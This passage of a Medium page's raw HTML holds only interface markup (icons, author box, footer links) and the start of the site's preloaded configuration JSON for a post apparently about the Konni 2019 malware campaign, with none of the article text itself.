.585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l li lj lk ll lm ln lo"><p class="bf b dv z du"><span class="lp">--</span></p></div></div></span><span class="l h g f tl tm"><div class="ab q kv kw"><div class="pw-multi-vote-icon fj je kx ky kz"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fd-hunter%2Fb45a0f321e9b&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fd-hunter%2Fa-look-into-konni-2019-campaign-b45a0f321e9b&amp;user=Doron+Karmi&amp;userId=36b231b019fe&amp;source=-----b45a0f321e9b---------------------clap_footer-----------"><div><div class="bm" aria-hidden="false"><div class="la ao lb lc ld le am lf lg lh kz"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l li lj lk ll lm ln lo"><p class="bf b dv z du"><span class="lp">--</span></p></div></div></span></div><div class="bq ab"><div><div class="bm" aria-hidden="false"><button class="ao la lq lr ab q fk ls lt" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="lu"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div></div><div class="ab q"><div class="pv l ix"><div><div class="bm" aria-hidden="false"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerBookmarkButton" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Fb45a0f321e9b&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fd-hunter%2Fa-look-into-konni-2019-campaign-b45a0f321e9b&amp;source=--------------------------bookmark_footer-----------"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="du lw" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="pv l ix"><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="footerSocialShareButton" class="af fk ah ai aj ak al me an ao ap ex mf mg lt mh"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg></button></div></div></div></div></div></div></div></div></div></footer><div class="tn to tp tq tr l bx"><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="cl ab ts cp"><div class="ab ia"><a rel="noopener follow" href="/@DoronKarmi?source=post_page-----b45a0f321e9b--------------------------------"><div class="l tt tu by tv ie"><div class="l fj"><img alt="Doron Karmi" class="l fd by tw tx cx" src="https://miro.medium.com/v2/resize:fill:144:144/2*u3JNIYOcE-R_QOB3kyY5tA.png" width="72" height="72" loading="lazy"/><div class="if by l tw tx fs n ig ft"></div></div></div></a><a href="https://medium.com/d-hunter?source=post_page-----b45a0f321e9b--------------------------------" rel="noopener follow"><div class="ty ab fj"><div><div class="bm" aria-hidden="false"><div class="l tz ua by tv ik"><div class="l fj"><img alt="d-hunter" class="l fd by bz ca cx" src="https://miro.medium.com/v2/resize:fill:64:64/1*v7qE3mVpxpXKKfAHIDIMMQ.png" width="32" height="32" loading="lazy"/><div class="if by l bz ca fs n ig ft"></div></div></div></div></div></div></a></div><div class="j i d"><div class="ab"><span><button class="bf b bg z ub sr uc ud ue uf ug ev ew uh ui uj fa au fb fc fd bm fe ff">Follow</button></span><div class="dt l"><div><div><div class="bm" aria-hidden="false"><div class="l"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" rel="noopener follow" href="/m/signin?actionUrl=%2F_%2Fapi%2Fusers%2F36b231b019fe%2Flazily-enable-writer-subscription&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fd-hunter%2Fa-look-into-konni-2019-campaign-b45a0f321e9b&amp;user=Doron+Karmi&amp;userId=36b231b019fe&amp;source=-----b45a0f321e9b---------------------subscribe_user-----------"><button class="bf b bg z ul am um un uo up uq ur us ut ew uh ui uj fa fb fc fd bm fe ff" aria-label="Subscribe"><svg xmlns="http://www.w3.org/2000/svg" width="38" height="38" fill="none" viewBox="0 0 38 38" class="uk ua tz"><rect width="0.5" height="6.5" x="26.25" y="9.25" rx="0.25"></rect><rect width="0.5" height="6.5" x="29.75" y="12.25" rx="0.25" transform="rotate(90 29.75 12.25)"></rect><path d="M19.5 12.5h-7a1 1 0 0 0-1 1v11a1 1 0 0 0 1 1h13a1 1 0 0 0 1-1v-5"></path><path d="M11.5 14.5 19 20l4-3"></path></svg></button></a></span></div></div></div></div></div></div></div></div><div class="ab cn cp"><div class="l"><div class="ab q"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab q" rel="noopener follow" href="/@DoronKarmi?source=post_page-----b45a0f321e9b--------------------------------"><h2 class="pw-author-name bf uu uv uw ux bk"><span class="gn jo">Written by <!-- -->Doron Karmi</span></h2></a></div><div class="sp ab"><div class="l ix"><span class="pw-follower-count bf b bg z bk"><a class="af ag ah ai aj ak al am an ao ap aq ar iq" rel="noopener follow" href="/@DoronKarmi/followers?source=post_page-----b45a0f321e9b--------------------------------">4 Followers</a></span></div><div class="bf b bg z jf jg jh ab jj jk jl jm du jd"><span class="ir l" aria-hidden="true"><span class="bf b bg z du">·</span></span><span class="l ix">Editor for </span><div><div class="l" aria-hidden="false"><a class="af ag ah ai aj ak al am an ao ap aq ar iq ab q" href="https://medium.com/d-hunter?source=post_page-----b45a0f321e9b--------------------------------" rel="noopener follow"><p class="bf b bg z jf jg jh ji jj jk jl jm bk">d-hunter</p></a></div></div></div></div><div class="uy l"><p class="bf b bg z bk"><span class="gn">Threat Hunter • Threat Research • Malware Analysis</span></p></div></div><div class="h k"><div class="ab"><span><button class="bf b bg z ub sr uc ud ue uf ug ev ew uh ui uj fa au fb fc fd bm fe ff">Follow</button></span><div class="dt l"><div><div><div class="bm" aria-hidden="false"><div class="l"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" rel="noopener follow" href="/m/signin?actionUrl=%2F_%2Fapi%2Fusers%2F36b231b019fe%2Flazily-enable-writer-subscription&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fd-hunter%2Fa-look-into-konni-2019-campaign-b45a0f321e9b&amp;user=Doron+Karmi&amp;userId=36b231b019fe&amp;source=-----b45a0f321e9b---------------------subscribe_user-----------"><button class="bf b bg z ul am um un uo up uq ur us ut ew uh ui uj fa fb fc fd bm fe ff" aria-label="Subscribe"><svg xmlns="http://www.w3.org/2000/svg" width="38" height="38" fill="none" viewBox="0 0 38 38" class="uk ua tz"><rect width="0.5" height="6.5" x="26.25" y="9.25" rx="0.25"></rect><rect width="0.5" height="6.5" x="29.75" y="12.25" rx="0.25" transform="rotate(90 29.75 12.25)"></rect><path d="M19.5 12.5h-7a1 1 0 0 0-1 1v11a1 1 0 0 0 1 1h13a1 1 0 0 0 1-1v-5"></path><path d="M11.5 14.5 19 20l4-3"></path></svg></button></a></span></div></div></div></div></div></div></div></div><div class="uz bh va vb vc vd ve vf"></div></div></div><div class="h k j"><div class="uz bh va vg"></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="vh ab kv ja"><div class="vi vj l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://help.medium.com/hc/en-us?source=post_page-----b45a0f321e9b--------------------------------" rel="noopener follow"><p class="bf b dv z du">Help</p></a></div><div class="vi vj l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.statuspage.io/?source=post_page-----b45a0f321e9b--------------------------------" rel="noopener follow"><p class="bf b dv z du">Status</p></a></div><div class="vi vj l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" rel="noopener follow" href="/about?autoplay=1&amp;source=post_page-----b45a0f321e9b--------------------------------"><p class="bf b dv z du">About</p></a></div><div class="vi vj l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" rel="noopener follow" href="/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----b45a0f321e9b--------------------------------"><p class="bf b dv z du">Careers</p></a></div><div class="vi vj l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="pressinquiries@medium.com?source=post_page-----b45a0f321e9b--------------------------------" rel="noopener follow"><p class="bf b dv z du">Press</p></a></div><div class="vi vj l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://blog.medium.com/?source=post_page-----b45a0f321e9b--------------------------------" rel="noopener follow"><p class="bf b dv z du">Blog</p></a></div><div class="vi vj l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----b45a0f321e9b--------------------------------" rel="noopener follow"><p class="bf b dv z du">Privacy</p></a></div><div class="vi vj l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----b45a0f321e9b--------------------------------" rel="noopener follow"><p class="bf b dv z du">Terms</p></a></div><div class="vi vj l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://speechify.com/medium?source=post_page-----b45a0f321e9b--------------------------------" rel="noopener follow"><p class="bf b dv z du">Text to speech</p></a></div><div class="vi l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" rel="noopener follow" href="/business?source=post_page-----b45a0f321e9b--------------------------------"><p class="bf b dv z du">Teams</p></a></div></div></div></div></div></div></div></div></div></div><script>window.__BUILD_ID__="main-20241017-182126-a0128a89d2"</script><script>window.__GRAPHQL_URI__ = "https://medium.com/_/graphql"</script><script>window.__PRELOADED_STATE__ = {"algolia":{"queries":{}},"cache":{"experimentGroupSet":true,"reason":"","group":"enabled","tags":["group-edgeCachePosts","post-b45a0f321e9b","user-36b231b019fe","collection-403a7b3e8c94"],"serverVariantState":"44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a","middlewareEnabled":true,"cacheStatus":"DYNAMIC","shouldUseCache":true,"vary":[],"lohpSummerUpsellEnabled":false,"publicationHierarchyEnabled":false},"client":{"hydrated":false,"isUs":false,"isNativeMedium":false,"isSafariMobile":false,"isSafari":false,"isFirefox":false,"routingEntity":{"type":"DEFAULT","explicit":false},"viewerIsBot":false},"debug":{"requestId":"8233fc08-9339-476f-86d3-6bbd84089e82","hybridDevServices":[],"originalSpanCarrier":{"traceparent":"00-0dd9269ebc3d0bffe41337caa0b51909-cfdef1a47fc46b1f-01"}},"multiVote":{"clapsPerPost":{}},"navigation":{"branch":{"show":null,"hasRendered":null,"blockedByCTA":false},"hideGoogleOneTap":false,"hasRenderedAlternateUserBanner":null,"currentLocation":"https:\u002F\u002Fmedium.com\u002Fd-hunter\u002Fa-look-into-konni-2019-campaign-b45a0f321e9b","host":"medium.com","hostname":"medium.com","referrer":"","hasSetReferrer":false,"susiModal":{"step":null,"operation":"register"},"postRead":false,"partnerProgram":{"selectedCountryCode":null},"queryString":"","currentHash":""},"config":{"nodeEnv":"production","version":"main-20241017-182126-a0128a89d2","target":"production","productName":"Medium","publicUrl":"https:\u002F\u002Fcdn-client.medium.com\u002Flite","authDomain":"medium.com","authGoogleClientId":"216296035834-k1k6qe060s2tp2a2jam4ljdcms00sttg.apps.googleusercontent.com","favicon":"production","glyphUrl":"https:\u002F\u002Fglyph.medium.com","branchKey":"key_live_ofxXr2qTrrU9NqURK8ZwEhknBxiI6KBm","algolia":{"appId":"MQ57UUUQZ2","apiKeySearch":"394474ced050e3911ae2249ecc774921","indexPrefix":"medium_","host":"-dsn.algolia.net"},"recaptchaKey":"6Lfc37IUAAAAAKGGtC6rLS13R1Hrw_BqADfS1LRk","recaptcha3Key":"6Lf8R9wUAAAAABMI_85Wb8melS7Zj6ziuf99Yot5","recaptchaEnterpriseKeyId":"6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp","datadog":{"applicationId":"6702d87d-a7e0-42fe-bbcb-95b469547ea0","clientToken":"pub853ea8d17ad6821d9f8f11861d23dfed","rumToken":"pubf9cc52896502b9413b68ba36fc0c7162","context":{"deployment":{"target":"production","tag":"main-20241017-182126-a0128a89d2","commit":"a0128a89d2d76bfa55b25492370b0bae4050224f"}},"datacenter":"us"},"googleAnalyticsCode":"G-7JY7T788PK","googlePay":{"apiVersion":"2","apiVersionMinor":"0","merchantId":"BCR2DN6TV7EMTGBM","merchantName":"Medium","instanceMerchantId":"13685562959212738550"},"applePay":{"version":3},"signInWallCustomDomainCollectionIds":["3a8144eabfe3","336d898217ee","61061eb0c96b","138adf9c44c","819cc2aaeee0"],"mediumMastodonDomainName":"me.dm","mediumOwnedAndOperatedCollectionIds":["8a9336e5bb4","b7e45b22fec3","193b68bd4fba","8d6b8a439e32","54c98c43354d","3f6ecf56618","d944778ce714","92d2092dc598","ae2a65f35510","1285ba81cada","544c7006046e","fc8964313712","40187e704f1c","88d9857e584e","7b6769f2748b","bcc38c8f6edf","cef6983b292","cb8577c9149e","444d13b52878","713d7dbc99b0","ef8e90590e66","191186aaafa0","55760f21cdc5","9dc80918cc93","bdc4052bbdba","8ccfed20cbb2"],"tierOneDomains":["medium.com","thebolditalic.com","arcdigital.media","towardsdatascience.com","uxdesign.cc","codeburst.io","psiloveyou.xyz","writingcooperative.com","entrepreneurshandbook.co","prototypr.io","betterhumans.coach.me","theascent.pub"],"topicsToFollow":["d61cf867d93f","8a146bc21b28","1eca0103fff3","4d562ee63426","aef1078a3ef5","e15e46793f8d","6158eb913466","55f1c20aba7a","3d18b94f6858","4861fee224fd","63c6f1f93ee","1d98b3a9a871","decb52b64abf","ae5d4995e225","830cded25262"],"topicToTagMappings":{"accessibility":"accessibility","addiction":"addiction","android-development":"android-development","art":"art","artificial-intelligence":"artificial-intelligence","astrology":"astrology","basic-income":"basic-income","beauty":"beauty","biotech":"biotech","blockchain":"blockchain","books":"books","business":"business","cannabis":"cannabis","cities":"cities","climate-change":"climate-change","comics":"comics","coronavirus":"coronavirus","creativity":"creativity","cryptocurrency":"cryptocurrency","culture":"culture","cybersecurity":"cybersecurity","data-science":"data-science","design":"design","digital-life":"digital-life","disability":"disability","economy":"economy","education":"education","equality":"equality","family":"family","feminism":"feminism","fiction":"fiction","film":"film","fitness":"fitness","food":"food","freelancing":"freelancing","future":"future","gadgets":"gadgets","gaming":"gaming","gun-control":"gun-control","health":"health","history":"history","humor":"humor","immigration":"immigration","ios-development":"ios-development","javascript":"javascript","justice":"justice","language":"language","leadership":"leadership","lgbtqia":"lgbtqia","lifestyle":"lifestyle","machine-learning":"machine-learning","makers":"makers","marketing":"marketing","math":"math","media":"media","mental-health":"mental-health","mindfulness":"mindfulness","money":"money","music":"music","neuroscience":"neuroscience","nonfiction":"nonfiction","outdoors":"outdoors","parenting":"parenting","pets":"pets","philosophy":"philosophy","photography":"photography","podcasts":"podcast","poetry":"poetry","politics":"politics","privacy":"privacy","product-management":"product-management","productivity":"productivity","programming":"programming","psychedelics":"psychedelics","psychology":"psychology","race":"race","relationships":"relationships","religion":"religion","remote-work":"remote-work","san-francisco":"san-francisco","science":"science","self":"self","self-driving-cars":"self-driving-cars","sexuality":"sexuality","social-media":"social-media","society":"society","software-engineering":"software-engineering","space":"space","spirituality":"spirituality","sports":"sports","startups":"startup","style":"style","technology":"technology","transportation":"transportation","travel":"travel","true-crime":"true-crime","tv":"tv","ux":"ux","venture-capital":"venture-capital","visual-design":"visual-design","work":"work","world":"world","writing":"writing"},"defaultImages":{"avatar":{"imageId":"1*dmbNkD5D-u45r44go_cf0g.png","height":150,"width":150},"orgLogo":{"imageId":"7*V1_7XP4snlmqrc_0Njontw.png","height":110,"width":500},"postLogo":{"imageId":"bd978bb536350a710e8efb012513429cabdc4c28700604261aeda246d0f980b7","height":810,"width":1440},"postPreviewImage":{"imageId":"1*hn4v1tCaJy7cWMyb0bpNpQ.png","height":386,"width":579}},"collectionStructuredData":{"8d6b8a439e32":{"name":"Elemental","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F980\u002F1*9ygdqoKprhwuTVKUM0DLPA@2x.png","width":980,"height":159}}},"3f6ecf56618":{"name":"Forge","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F596\u002F1*uULpIlImcO5TDuBZ6lm7Lg@2x.png","width":596,"height":183}}},"ae2a65f35510":{"name":"GEN","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F264\u002F1*RdVZMdvfV3YiZTw6mX7yWA.png","width":264,"height":140}}},"88d9857e584e":{"name":"LEVEL","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*JqYMhNX6KNNb2UlqGqO2WQ.png","width":540,"height":108}}},"7b6769f2748b":{"name":"Marker","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F383\u002F1*haCUs0wF6TgOOvfoY-jEoQ@2x.png","width":383,"height":92}}},"444d13b52878":{"name":"OneZero","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*cw32fIqCbRWzwJaoQw6BUg.png","width":540,"height":123}}},"8ccfed20cbb2":{"name":"Zora","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*tZUQqRcCCZDXjjiZ4bDvgQ.png","width":540,"height":106}}}},"embeddedPostIds":{"coronavirus":"cd3010f9d81f"},"sharedCdcMessaging":{"COVID_APPLICABLE_TAG_SLUGS":[],"COVID_APPLICABLE_TOPIC_NAMES":[],"COVID_APPLICABLE_TOPIC_NAMES_FOR_TOPIC_PAGE":[],"COVID_MESSAGES":{"tierA":{"text":"For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":66,"end":73,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"tierB":{"text":"Anyone can publish on Medium per our Policies, but we don’t fact-check every story. For more info about the coronavirus, see cdc.gov.","markups":[{"start":37,"end":45,"href":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Fcategories\u002F201931128-Policies-Safety"},{"start":125,"end":132,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"paywall":{"text":"This article has been made free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":56,"end":70,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":138,"end":145,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"unbound":{"text":"This article is free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":45,"end":59,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":127,"end":134,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]}},"COVID_BANNER_POST_ID_OVERRIDE_WHITELIST":["3b31a67bff4a"]},"sharedVoteMessaging":{"TAGS":["politics","election-2020","government","us-politics","election","2020-presidential-race","trump","donald-trump","democrats","republicans","congress","republican-party","democratic-party","biden","joe-biden","maga"],"TOPICS":["politics","election"],"MESSAGE":{"text":"Find out more about the U.S. election results here.","markups":[{"start":46,"end":50,"href":"https:\u002F\u002Fcookpolitical.com\u002F2020-national-popular-vote-tracker"}]},"EXCLUDE_POSTS":["397ef29e3ca5"]},"embedPostRules":[],"recircOptions":{"v1":{"limit":3},"v2":{"limit":8}},"braintreeClientKey":"production_zjkj96jm_m56f8fqpf7ngnrd4","braintree":{"enabled":true,"merchantId":"m56f8fqpf7ngnrd4","merchantAccountId":{"usd":"AMediumCorporation_instant","eur":"amediumcorporation_EUR","cad":"amediumcorporation_CAD"},"publicKey":"ds2nn34bg2z7j5gd","braintreeEnvironment":"production","dashboardUrl":"https:\u002F\u002Fwww.braintreegateway.com\u002Fmerchants","gracePeriodDurationInDays":14,"mediumMembershipPlanId":{"monthly":"ce105f8c57a3","monthlyV2":"e8a5e126-792b-4ee6-8fba-d574c1b02fc5","monthlyWithTrial":"d5ee3dbe3db8","monthlyPremium":"fa741a9b47a2","yearly":"a40ad4a43185","yearlyV2":"3815d7d6-b8ca-4224-9b8c-182f9047866e","yearlyStaff":"d74fb811198a","yearlyWithTrial":"b3bc7350e5c7","yearlyPremium":"e21bd2c12166","monthlyOneYearFree":"e6c0637a-2bad-4171-ab4f-3c268633d83c","monthly25PercentOffFirstYear":"235ecc62-0cdb-49ae-9378-726cd21c504b","monthly20PercentOffFirstYear":"ba518864-9c13-4a99-91ca-411bf0cac756","monthly15PercentOffFirstYear":"594c029b-9f89-43d5-88f8-8173af4e070e","monthly10PercentOffFirstYear":"c6c7bc9a-40f2-4b51-8126-e28511d5bdb0","monthlyForStudents":"629ebe51-da7d-41fd-8293-34cd2f2030a8","yearlyOneYearFree":"78ba7be9-0d9f-4ece-aa3e-b54b826f2bf1","yearly25PercentOffFirstYear":"2dbb010d-bb8f-4eeb-ad5c-a08509f42d34","yearly20PercentOffFirstYear":"47565488-435b-47f8-bf93-40d5fbe0ebc8","yearly15PercentOffFirstYear":"8259809b-0881-47d9-acf7-6c001c7f720f","yearly10PercentOffFirstYear":"9dd694fb-96e1-472c-8d9e-3c868d5c1506","yearlyForStudents":"e29345ef-ab1c-4234-95c5-70e50fe6bc23","monthlyCad":"p52orjkaceei","yearlyCad":"h4q9g2up9ktt"},"braintreeDiscountId":{"oneMonthFree":"MONTHS_FREE_01","threeMonthsFree":"MONTHS_FREE_03","sixMonthsFree":"MONTHS_FREE_06","fiftyPercentOffOneYear":"FIFTY_PERCENT_OFF_ONE_YEAR"},"3DSecureVersion":"2","defaultCurrency":"usd","providerPlanIdCurrency":{"4ycw":"usd","rz3b":"usd","3kqm":"usd","jzw6":"usd","c2q2":"us